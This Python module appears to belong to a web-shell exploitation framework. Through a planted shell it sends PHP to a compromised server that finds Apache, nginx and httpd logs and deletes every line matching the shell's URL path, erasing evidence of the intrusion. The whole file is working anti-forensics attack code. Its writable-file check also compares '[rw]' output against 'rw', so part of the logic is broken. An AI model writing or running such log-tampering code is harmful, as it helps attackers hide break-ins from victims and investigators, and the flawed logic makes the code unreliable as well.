"""clearlog: remove matching lines from server log files (no exec required)."""

from __future__ import annotations

from typing import TYPE_CHECKING, Optional
from urllib.parse import urlparse

from evalsploit.modules.base import Module, php_quote, confirm_dangerous
from evalsploit.modules.registry import register

if TYPE_CHECKING:
    from evalsploit.context import SessionContext


_DETECT_PHP = r"""
$_cl_logs = array_merge(
    glob('/var/log/{apache2,nginx,httpd,apache}/*.log', GLOB_BRACE) ?: [],
    glob('/var/log/{apache2,nginx,httpd,apache}/*_log', GLOB_BRACE) ?: [],
    glob('/var/log/*.log') ?: []
);
foreach($_cl_logs as $_f){
    if(is_file($_f) && is_readable($_f)){
        $_cl_w = is_writable($_f) ? '[rw]' : '[r-]';
        echo $_cl_w.' '.$_f.PHP_EOL;
    }
}
""".strip()

_CLEAN_TEMPLATE = r"""
$_cl_path=__PATH__;
$_cl_pat=__PAT__;
$_cl_lines=@file($_cl_path,FILE_IGNORE_NEW_LINES);
if($_cl_lines===false){
    echo 'ERR: cannot read'.PHP_EOL;
}else{
    $_cl_n=0;$_cl_k=array();
    foreach($_cl_lines as $_cl_l){
        if(strpos($_cl_l,$_cl_pat)!==false) $_cl_n++;
        else $_cl_k[]=$_cl_l;
    }
    $_cl_out=implode("\n",$_cl_k);
    if(!empty($_cl_k)) $_cl_out.="\n";
    if(@file_put_contents($_cl_path,$_cl_out)===false){
        echo 'ERR: cannot write'.PHP_EOL;
    }else{
        echo 'OK '.$_cl_n.' line(s) removed'.PHP_EOL;
    }
}
""".strip()


def _clean_php(path: str, pattern: str) -> str:
    return (
        _CLEAN_TEMPLATE
        .replace("__PATH__", php_quote(path))
        .replace("__PAT__", php_quote(pattern))
    )


def _url_pattern(ctx: "SessionContext") -> str:
    url = getattr(ctx.config, "url", "")
    if not url:
        return ""
    try:
        return urlparse(url).path
    except Exception:
        return url


@register(
    "clearlog",
    description="Remove matching lines from server log files",
    usage="clearlog detect | clearlog <path> [pattern] | clearlog all [pattern]",
)
class ClearlogModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        parts = args.strip().split(None, 1)
        if not parts:
            print("Usage: clearlog detect | clearlog <path> [pattern] | clearlog all [pattern]")
            print("  Default pattern: URL path from config (e.g. /shell.php)")
            return None

        sub = parts[0]
        rest = parts[1].strip() if len(parts) > 1 else ""

        # ── detect ────────────────────────────────────────────────────────────
        if sub == "detect":
            out = ctx.send(_DETECT_PHP).strip()
            if not out:
                print("No readable log files found in common paths.")
            else:
                print(out)
            return None

        # ── all ───────────────────────────────────────────────────────────────
        if sub == "all":
            pattern = rest or _url_pattern(ctx)
            if not pattern:
                print("Error: no pattern specified and no URL in config.")
                print("Use: clearlog all <pattern>")
                return None
            out = ctx.send(_DETECT_PHP).strip()
            if not out:
                print("No readable log files found.")
                return None
            entries = []
            for line in out.splitlines():
                line = line.strip()
                if not line:
                    continue
                status, _, path = line.partition(' ')
                entries.append((status, path))
            writable = [(s, p) for s, p in entries if s == "rw"]
            print(f"Found {len(entries)} log file(s)  pattern: {pattern!r}")
            for status, path in entries:
                marker = "[rw]" if status == "rw" else "[r-]"
                print(f"  {marker} {path}")
            if not writable:
                print("No writable log files found.")
                return None
            if not confirm_dangerous(ctx, "clearlog all", f"{len(writable)} writable file(s)"):
                return None
            for _, log_path in writable:
                result = ctx.send(_clean_php(log_path, pattern)).strip()
                print(f"  {log_path}: {result}")
            return None

        # ── <path> [pattern] ──────────────────────────────────────────────────
        log_path = sub
        pattern = rest or _url_pattern(ctx)
        if not pattern:
            print("Error: no pattern specified and no URL in config.")
            print("Use: clearlog <path> <pattern>")
            return None
        if not confirm_dangerous(ctx, "clearlog", f"{log_path}  pattern={pattern!r}"):
            return None
        result = ctx.send(_clean_php(log_path, pattern)).strip()
        print(result or "Done")
        return None
